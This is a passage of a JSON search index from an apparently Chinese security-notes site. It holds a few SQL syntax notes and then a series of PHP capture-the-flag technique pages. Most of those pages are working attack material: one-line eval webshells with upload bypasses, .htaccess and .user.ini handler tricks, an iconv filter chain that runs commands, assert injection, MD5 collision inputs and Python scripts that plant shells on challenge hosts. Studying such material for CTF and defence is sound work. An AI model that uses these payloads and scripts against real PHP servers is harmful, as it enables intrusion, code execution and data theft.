表名重命名\nALTER TABLE t1 RENAME TO t2; 重命名列名\nALTER TABLE t1 RENAME c1 TO c2 ; 修改数据类型\nALTER TABLE t1 MODIFY c1 datatype; 约束\r#\r主键\nPRIMARY KEY (c1,c2) 外键\nFOREIGN KEY (c2) REFERENCES t2(c2) 唯一\nUNIQUE(c2,c3) 非空和空\nnull not null "},{"id":123,"href":"/docs/network-security/php/htaccess%E7%9A%84%E5%88%A9%E7%94%A8/","title":"Htaccess的利用","section":"php","content":"总结.htaccess利用与Bypass方式总结-安全客 - 安全资讯平台 (anquanke.com)\nimport requests\rhtaccess = \u0026#39;\u0026#39;\u0026#39;php_value auto_prepend_fi\\\\\rle \u0026#34;.htaccess\u0026#34;\r%23\u0026lt;?php system(\u0026#34;cat /????\u0026#34;);?\u0026gt;\\\\\u0026#39;\u0026#39;\u0026#39;\rurl = \u0026#39;http://d68ad6f6-f107-42e2-b2bc-0f4713f98e9d.node4.buuoj.cn:81/?filename={}\u0026amp;content={}\u0026#39;.format(\u0026#39;.htaccess\u0026#39;, htaccess)\rr = requests.get(url=url)\rprint(r.status_code) 最后的\\是为了使其不换行,\\用来绕过关键字\nfile_put_contents($filename, $content . \u0026#34;\\nJust one chance\u0026#34;) "},{"id":124,"href":"/docs/network-security/php/md5%E7%A2%B0%E6%92%9E/","title":"Md5碰撞","section":"php","content":"\r1.\r#\ra!=b\u0026amp;\u0026amp;md5(a)==md5(b) PHP中==是判断值是否相等，若两个变量的类型不相等，则会转化为相同类型后再进行比较。PHP在处理哈希字符串的时候，它把每一个以0e开头并且后面字符均为纯数字的哈希值都解析为0\n例子\nQNKCDZO\r0e830400451993494058024219903391\rs878926199a\r0e545993274517709034328855841020\rs155964671a\r0e342768416822451524974117254469\rs214587387a\r0e848240448830537924465865611904\rs214587387a\r0e848240448830537924465865611904\r0e215962017\r0e291242476940776845150308577824\rffifdyop\r\u0026#39;or\u0026#39; sql 闭合 2.\r#\ra!=b\u0026amp;\u0026amp;md5(a)===md5(b) md5函数无法处理数组，返回（NULL）\na[]=1\u0026amp;b[]=2 3.\r#\r(string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;]) md5相同\n\u0026lt;?php\r$s1 = \u0026#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab\u0026#34;;\r$s2 = \u0026#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab\u0026#34;;\r$s3 = \u0026#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab\u0026#34;;\rvar_dump(md5(urldecode($s1)));\rvar_dump(md5(urldecode($s2)));\rvar_dump(md5(urldecode($s3))); "},{"id":125,"href":"/docs/network-security/php/%E4%BC%AA%E5%8D%8F%E8%AE%AE/","title":"伪协议","section":"php","content":"\r1. php://file\r#\r一般用作递上去文件\nphp://filter/convert.base64-encode/resource=flag 2. data\r#\r可以执行命令\ndata://text.plain,hello_ctf\rdata://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg== 3. input\r#\rphp://input post同时传，也可传php代码执行\nhello ctf 常用于一下情况\nfile_get_content($name)==“hello ctf”\n关于绕过base64-encode字眼,使用其他编码\na=[\r\u0026#39;UCS-4*\u0026#39;,\r\u0026#39;UCS-4BE\u0026#39;,\r\u0026#39;UCS-4LE*\u0026#39;,\r\u0026#39;UCS-2\u0026#39;,\r\u0026#39;UCS-2BE\u0026#39;,\r\u0026#39;UCS-2LE\u0026#39;,\r\u0026#39;UTF-32*\u0026#39;,\r\u0026#39;UTF-32BE*\u0026#39;,\r\u0026#39;UTF-32LE*\u0026#39;,\r\u0026#39;UTF-16*\u0026#39;,\r\u0026#39;UTF-16BE*\u0026#39;,\r\u0026#39;UTF-16LE*\u0026#39;,\r\u0026#39;UTF-7\u0026#39;,\r\u0026#39;UTF7-IMAP\u0026#39;,\r\u0026#39;UTF-8*\u0026#39;,\r\u0026#39;ASCII*\u0026#39;,\r\u0026#39;SJIS*\u0026#39;,\r\u0026#39;EUC-JP*\u0026#39;,\r\u0026#39;eucJP-win*\u0026#39;,\r\u0026#39;SJIS-win*\u0026#39;,\r\u0026#39;ISO-2022-JP\u0026#39;,\r\u0026#39;ISO-2022-JP-MS\u0026#39;,\r\u0026#39;CP932\u0026#39;,\r\u0026#39;CP51932\u0026#39;,\r\u0026#39;BASE64\u0026#39;]\rp=[]\rfor i in a:\rfor j in a:\rp.append(i+\u0026#39;.\u0026#39;+j)\rprint(len(p))\rimport requests,time\rfor i in p:\rtime.sleep(0.1)\rresult=requests.get(f\u0026#39;http://61.147.171.105:58809/?filename=php://filter//convert.iconv.{i}/resource=flag.php\u0026#39;,timeout=5).text\rif len(result)\u0026gt;1120:\rprint(i,\u0026#39;------------------\u0026#39;)\r# break\rprint(i,len(result)) 亦可\nphp://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php\u0026amp;0=cat+/proc/self/environ "},{"id":126,"href":"/docs/network-security/php/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/","title":"函数漏洞","section":"php","content":"\rpreg_match\r#\r在没有修饰符s(匹配换行符)的时候。preg_match只能匹配一行\n最大回溯次数\n在正则匹配当中，如果存在符号 \u0026quot; .*? \u0026quot; ，那么匹配的时候便会使用非贪婪模式。非贪婪模式匹配原理简单来说就是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再回溯, 进行匹配。最大回溯是1000000次\npython\n\u0026#39;flag\u0026#39;*1000000+\u0026#39;system(\u0026#34;ls\u0026#34;)\u0026#39; 就绕过了system\nmt_seed\r#\r设置随机数种子\nPHP mt_rand安全杂谈及应用场景详解 - FreeBuf网络安全行业门户\n配合软件https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz\n编译\nmake str1 =\u0026#39;Hg11vtADEm\u0026#39;\rstr2 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;\rresult =\u0026#39;\u0026#39;\rlength = str(len(str2)-1)\rfor i in range(0,len(str1)):\rfor j in range(0,len(str2)):\rif str1[i] == str2[j]:\rresult += str(j) + \u0026#39; \u0026#39; +str(j) + \u0026#39; \u0026#39; + \u0026#39;0\u0026#39; + \u0026#39; \u0026#39; + length + \u0026#39; \u0026#39;\rbreak\rprint(result) ./php_mt_seed xx xx \u0026lt;?php\rmt_srand(348806110);\r$str_long1 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;;\r$str=\u0026#39;\u0026#39;;\r$len1=20;\rfor ( $i = 0; $i \u0026lt; $len1; $i++ ){\r$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }\recho $str;\r?\u0026gt; assert\r#\r断言，其写法相当于\nif(...){\r....\r}else{\rdie(...)\r} assert(\u0026#34;intval($_GET[num])==1919810\u0026#34;) or die(\u0026#34;error!\u0026#34;); 总的来说还是用拼接绕过\n如num=1);(1919810\n"},{"id":127,"href":"/docs/network-security/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"文件上传","section":"php","content":"\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; 加上头文件\nGIF89a \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; 绕过php字段\n\u0026lt;? $a = \u0026#34;assert\u0026#34;;$a(@$_POST[\u0026#39;shell\u0026#39;]); ?\u0026gt; \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;@eval($_POST[\u0026#39;cmd\u0026#39;])\u0026lt;/script\u0026gt; 绕过\r#\rapache解析漏洞\r#\rApache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析\n如png为白名单，apache无法解析png,会将其解析为php\n1.php.png 截断\r#\r1.php%00.png .htaccess\r#\r\u0026lt;FilesMatch \u0026#34;png\u0026#34;\u0026gt;\rSetHandler application/x-httpd-php\r\u0026lt;/FilesMatch\u0026gt; .user.ini\r#\r先上传.user.ini，后面的图片马会被自动解析为php\n.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。\nGIF89a\rauto_prepend_file=test.gif 不包含数字和字母的shell\nhttps://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html\n大小写\r#\rpass\n双写\r#\rpass\nThink PHP upload\r#\rthink php upload 在不传参的时候可以多文件上传\nimport requests\rurl = \u0026#34;http://8cbe0e9c-b7de-46f3-b93d-555073775ad1.node3.buuoj.cn/index.php/home/index/upload\u0026#34;\rfiles = {\u0026#39;file\u0026#39;:(\u0026#34;1.txt\u0026#34;,\u0026#34;\u0026#34;)}\rfiles2={\u0026#39;file[]\u0026#39;:(\u0026#39;1.php\u0026#39;,\u0026#34;\u0026lt;?php eval($_GET[\u0026#39;cmd\u0026#39;])?\u0026gt;\u0026#34;)} # 用数组多文件上传\rr = requests.post(url,files = files) #上传两遍,因为文件名是以uniqid命名的\rprint (r.text)\rr = requests.post(url,files = files2)\rprint (r.text)\rr = requests.post(url,files = files)\rprint (r.text) 再爆破php的文件名\n"},{"id":128,"href":"/docs/network-security/php/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","title":"文件包含","section":"php","content":"\r文件包含\r#\r常见的有include,require,include_once,require_once\n其中once表示已经包含的不会再包含\n如果有include flah.php\n在让我们包含include_once $file\n可以用\n/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php 利用伪协议\ndata,file等\n174.1.33.5\tweb1 172.2.215.9\tweb1\n"}]